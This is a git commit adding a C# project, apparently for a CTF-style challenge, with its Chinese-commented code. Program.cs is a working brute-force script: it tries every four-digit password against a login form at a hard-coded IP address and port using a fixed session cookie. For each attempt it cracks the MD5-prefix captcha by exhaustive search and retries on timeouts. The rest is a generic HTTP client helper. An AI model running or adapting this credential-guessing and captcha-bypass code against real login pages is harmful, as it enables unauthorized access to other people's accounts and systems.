30ed8e5ab155e1d99f22d5f1ddd97a245fbec016
hhj120917 <1209172438@qq.com>
2019-11-03 13:36:52 +0800

    全部上传

---
+++ fuckcnss/FuckCNSS/Program.cs
@@ -0,0 +1,112 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Security.Cryptography;
+using System.Net;
+using System.Threading;
+using System.Text.RegularExpressions;
+namespace FuckCNSS
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            find();
+            Console.ReadKey();
+            //find();
+
+        }
+        static void find()
+        {
+            CookieContainer cc = new CookieContainer();
+            Cookie c = new Cookie("PHPSESSID", "jf9ev7qb2curffrv224in3p3n2");
+            cc.Add(new Uri("http://64.156.14.99:32785/"), c);
+            string pw = "159";
+            Console.ForegroundColor = ConsoleColor.Red;
+            Regex rg = new Regex(Properties.Resources.MD5_PASSWORD);
+            for (int i = 1000; i < 10000; i++)
+            {
+                string code = getPW(pw);
+                string re = new http().Post("http://64.156.14.99:32785/index.php", "password=" + i + "&code=" + code, ref cc);
+                if(re == "操作超时")
+                {
+
+                    Console.ForegroundColor = ConsoleColor.Blue;
+                    Console.WriteLine("超时重试...");
+                    i--;
+                    Console.ForegroundColor = ConsoleColor.Red;
+                }
+                else if (re.IndexOf("Dont try again") != -1)
+                {
+                    Console.ForegroundColor = ConsoleColor.Blue;
+                    Console.WriteLine("匹配" + pw + "时异常MD5，重试中...");
+                    i--;
+                    Match mc = rg.Match(re);
+                    pw = mc.Groups[1].Value;
+                    Console.ForegroundColor = ConsoleColor.Red;
+                }
+                else if (re.IndexOf("密码错误") == -1)
+                {
+                    Console.WriteLine(re);
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine("密码正确：" + i);
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("匹配" + pw + "时遇到错误密码：" + i);
+                    Match mc = rg.Match(re);
+                    pw = mc.Groups[1].Value;
+                }
+            }
+        }
+        static private string getPW(string pw)
+        {
+            foreach (char w in Properties.Resources.CONST_STR)
+            {
+                foreach (char x in Properties.Resources.CONST_STR)
+                {
+                    foreach (char y in Properties.Resources.CONST_STR)
+                    {
+                        foreach (char z in Properties.Resources.CONST_STR)
+                        {
+                            string s = (w + "") + (x + "") + (y + "") + (z + "");
+                            string t = MD5Encrypt(s).Substring(0, 3);
+                            //Console.WriteLine("s:" + s + " t:" + t);
+                            if (t == pw)
+                            {
+                                return s;
+                            }
+                        }
+                    }
+                }
+            }
+
+            return "";
+        }
+        /// <summary>
+        /// 用MD5加密字符串
+        /// </summary>
+        /// <param name="password">待加密的字符串</param>
+        /// <returns></returns>
+        static public string MD5Encrypt(string str)
+        {
+            MD5 md5 = System.Security.Cryptography.MD5.Create();
+            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(str);
+            byte[] hashBytes = md5.ComputeHash(inputBytes);
+
+            // Convert the byte array to hexadecimal string
+            StringBuilder sb = new StringBuilder();
+            for (int i = 0; i < hashBytes.Length; i++)
+            {
+                sb.Append(hashBytes[i].ToString("X2"));
+                // To force the hex string to lower-case letters instead of
+                // upper-case, use he following line instead:
+                // sb.Append(hashBytes[i].ToString("x2")); 
+            }
+            return sb.ToString().ToLower();
+        }
+    }
+}
---
+++ fuckcnss/FuckCNSS/http.cs
@@ -0,0 +1,325 @@
+﻿using System;
+using System.Collections;
+using System.Collections.Generic;
+using System.IO;
+using System.IO.Compression;
+using System.Net;
+using System.Text;
+
+namespace FuckCNSS
+{
+    public class http
+    {
+        public string Proxy { get; set; }
+        public int TimeOut { get; set; }
+        public string UserAgent { get; set; }
+        public string Referer { get; set; }
+        public bool Redirect { get; set; }
+        public Encoding Encoding { get; set; }
+        public string Host { get; set; }
+        public string Accept { get; set; }
+        public bool UseGZIP { get; set; }
+        const string ContentTYPE = "application/x-www-form-urlencoded";
+        /// <summary>
+        /// Request Method
+        /// </summary>
+        public const string MethodGET = "GET";
+        /// <summary>
+        /// Request Method
+        /// </summary>
+        public const string MethodPOST = "POST";
+
+        public http()
+        {
+            Init(16);
+
+        }
+        public http(int ConnectionLimit)
+        {
+            Init(ConnectionLimit);
+        }
+        /// <summary>
+        /// Initiate http setting
+        /// </summary>
+        /// <param name="ConnectionLimit"></param>
+        private void Init(int ConnectionLimit)
+        {
+            TimeOut = 10000;//10 s
+            UserAgent = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36";
+            Encoding = Encoding.UTF8;
+            Redirect = true;
+            UseGZIP = false;
+            Host = "";
+            SetConnectionLimit(ConnectionLimit);
+            void SetConnectionLimit(int num)
+            {
+                if (num > 0 && num < 1024)
+                    ServicePointManager.DefaultConnectionLimit = num;
+            }
+        }
+        /// <summary>
+        ///  GET网页请求
+        /// </summary>
+        /// <param name="url">请求网址</param>
+        /// <returns>网页源代码</returns>
+        public string Get(string url)
+        {
+            try
+            {
+                HttpWebRequest hw = NewHttpWebRequest(url, MethodGET);
+                return GetString(hw);
+            }
+            catch (WebException e)
+            {
+                return e.Message;
+            }
+        }
+        private string GetString(HttpWebRequest hw)
+        {
+            HttpWebResponse hwr = (HttpWebResponse)hw.GetResponse();
+            if (!UseGZIP)
+            {
+                StreamReader sr = new StreamReader(hwr.GetResponseStream(), Encoding);
+                return sr.ReadToEnd();
+            }
+            else
+            {
+                GZipStream gsr = new GZipStream(hwr.GetResponseStream(), CompressionMode.Decompress);
+                List<Byte> tBytes = new List<byte>();
+                byte[] buff = new byte[1];//如果修改为>2 可能会多出或少了一些内容；所以我选择一个一个的读入！
+                int count = 0;
+                do
+                {
+                    count = gsr.Read(buff, 0, buff.Length);
+                    if (count != 0)
+                    {
+                        tBytes.AddRange(buff);
+                    }
+                } while (count > 0);
+                return Encoding.GetString(tBytes.ToArray());
+            }
+        }
+
+        private HttpWebRequest NewHttpWebRequest(string url, string method)
+        {
+            HttpWebRequest hw = (HttpWebRequest)WebRequest.Create(url);
+            if (Proxy != "") hw.Proxy = new WebProxy(Proxy, true);
+            hw.Method = method;
+            hw.Timeout = TimeOut;
+            hw.ContentType = ContentTYPE;
+            hw.UserAgent = UserAgent;
+            hw.Referer = Referer;
+            hw.AllowAutoRedirect = Redirect;
+            //hw.Host = Host;
+            hw.Accept = Accept;
+            return hw;
+        }
+
+        /// <summary>
+        ///  GET 请求
+        /// </summary>
+        /// <param name="url">请求网址</param>
+        /// <returns>Stream</returns>
+        public Stream GetStream(string url)
+        {
+            try
+            {
+                HttpWebRequest hw = NewHttpWebRequest(url, MethodGET);
+                HttpWebResponse hwr = (HttpWebResponse)hw.GetResponse();
+                return hwr.GetResponseStream();
+            }
+            catch (WebException e)
+            {
+                throw e;
+            }
+
+        }
+        /// <summary>
+        ///  GET 请求
+        /// </summary>
+        /// <param name="url">请求网址</param>
+        /// <returns>Stream</returns>
+        public Stream GetStream(string url, CookieContainer cc)
+        {
+            try
+            {
+                HttpWebRequest hw = NewHttpWebRequest(url, MethodGET);
+                hw.CookieContainer = cc;
+                HttpWebResponse hwr = (HttpWebResponse)hw.GetResponse();
+                return hwr.GetResponseStream();
+            }
+            catch (WebException e)
+            {
+                throw e;
+            }
+
+        }
+        /// <summary>
+        /// 网页请求
+        /// </summary>
+        /// <param name="url">请求地址</param>
+        /// <param name="postData">发送数据</param>
+        /// <returns>网页源码（出错返回空文本）</returns>
+        public string Post(string url, string postData)
+        {
+            try
+            {
+                HttpWebRequest hw = NewHttpWebRequest(url, MethodPOST);
+                byte[] PD = Encoding.GetBytes(postData);
+                Stream Stream = hw.GetRequestStream();
+                Stream.Write(PD, 0, PD.Length);
+                Stream.Close();
+                HttpWebResponse hwr = (HttpWebResponse)hw.GetResponse();
+                StreamReader sr = new StreamReader(hwr.GetResponseStream(), Encoding);
+                return sr.ReadToEnd();
+            }
+            catch (WebException e)
+            {
+                return e.Message;
+            }
+        }
+        /// <summary>
+        /// 网页请求
+        /// </summary>
+        /// <param name="url">请求地址</param>
+        /// <param name="postData">发送数据</param>
+        /// <returns>网页源码（出错返回空文本）</returns>
+        public string Post(string url, string[,] postData)
+        {
+            try
+            {
+                HttpWebRequest hw = NewHttpWebRequest(url, MethodPOST);
+                string pdStr = NewPostData(postData);
+                byte[] PD = Encoding.GetBytes(pdStr);
+                Stream Stream = hw.GetRequestStream();
+                Stream.Write(PD, 0, PD.Length);
+                Stream.Close();
+                HttpWebResponse hwr = (HttpWebResponse)hw.GetResponse();
+                StreamReader sr = new StreamReader(hwr.GetResponseStream(), Encoding);
+                return sr.ReadToEnd();
+            }
+            catch (WebException e)
+            {
+                return e.Message;
+            }
+        }
+        /// <summary>
+        ///  GET网页请求
+        /// </summary>
+        /// <param name="url">请求网址</param>
+        /// <returns>网页源代码</returns>
+        public string Get(string url, ref CookieContainer cc)
+        {
+            try
+            {
+                HttpWebRequest hw = NewHttpWebRequest(url, MethodGET);
+                hw.CookieContainer = cc;
+                return GetString(hw);
+            }
+            catch (WebException e)
+            {
+                return e.Message;
+            }
+        }
+        /// <summary>
+        /// 网页请求
+        /// </summary>
+        /// <param name="url">请求地址</param>
+        /// <param name="postData">发送数据</param>
+        /// <returns>网页源码（出错返回空文本）</returns>
+        public string Post(string url, string postData, ref CookieContainer cc)
+        {
+            try
+            {
+                HttpWebRequest hw = NewHttpWebRequest(url, MethodPOST);
+                hw.CookieContainer = cc;
+                byte[] PD = Encoding.GetBytes(postData);
+                Stream Stream = hw.GetRequestStream();
+                Stream.Write(PD, 0, PD.Length);
+                Stream.Close();
+                return GetString(hw);
+            }
+            catch (WebException e)
+            {
+                return e.Message;
+            }
+        }
+        /// <summary>
+        /// 网页请求
+        /// </summary>
+        /// <param name="url">请求地址</param>
+        /// <param name="postData">发送数据</param>
+        /// <returns>网页源码（出错返回空文本）</returns>
+        public string Post(string url, string[,] postData, ref CookieContainer cc)
+        {
+            try
+            {
+                HttpWebRequest hw = NewHttpWebRequest(url, MethodPOST);
+                hw.CookieContainer = cc;
+                string pdStr = NewPostData(postData);
+                byte[] PD = Encoding.GetBytes(pdStr);
+                Stream Stream = hw.GetRequestStream();
+                Stream.Write(PD, 0, PD.Length);
+                Stream.Close();
+                return GetString(hw);
+            }
+            catch (WebException e)
+            {
+                return e.Message;
+            }
+        }
+        /// <summary>
+        /// 获取Cookie的值
+        /// </summary>
+        /// <param name="cookieName">Cookie名称</param>
+        /// <param name="cc">Cookie集合对象</param>
+        /// <returns>返回Cookie名称对应值</returns>
+        public string GetCookie(string cookieName, CookieContainer cc)
+        {
+            List<Cookie> lstCookies = new List<Cookie>();
+            Hashtable table = (Hashtable)cc.GetType().InvokeMember("m_domainTable",
+                                                                   System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.GetField |
+                                                                   System.Reflection.BindingFlags.Instance, null, cc, new object[] { });
+            foreach (object pathList in table.Values)
+            {
+                SortedList lstCookieCol = (SortedList)pathList.GetType().InvokeMember("m_list",
+                                                                                      System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.GetField
+                                                                                      | System.Reflection.BindingFlags.Instance, null, pathList, new object[] { });
+                foreach (CookieCollection colCookies in lstCookieCol.Values)
+                    foreach (Cookie c1 in colCookies) lstCookies.Add(c1);
+            }
+            var model = lstCookies.Find(p => p.Name == cookieName);
+            if (model != null)
+            {
+                return model.Value;
+            }
+            return string.Empty;
+        }
+        /// <summary>
+        /// 获取CookieContainer
+        /// </summary>
+        /// <param name="url">Cookie的域</param>
+        /// <param name="cookie">Cookie值(支持多个如,A=1;B=2;)</param>
+        /// <returns></returns>
+        public CookieContainer NewCookieContainer(string url, string cookie)
+        {
+            CookieContainer cc = new CookieContainer();
+            cc.SetCookies(new Uri(url), cookie);
+            return cc;
+        }
+        public string NewPostData(string[,] Params)
+        {
+            StringBuilder sb = new StringBuilder();
+            for (int i = 0; i < Params.GetLength(0); i++)
+            {
+                sb.Append(Params[i, 0]);
+                sb.Append("=");
+                sb.Append(Params[i, 1]);
+                sb.Append("&");
+            }
+            sb.Remove(sb.Length - 1, 1);//删除最后一个[&]符号
+            return sb.ToString();
+        }
+    }
+
+}
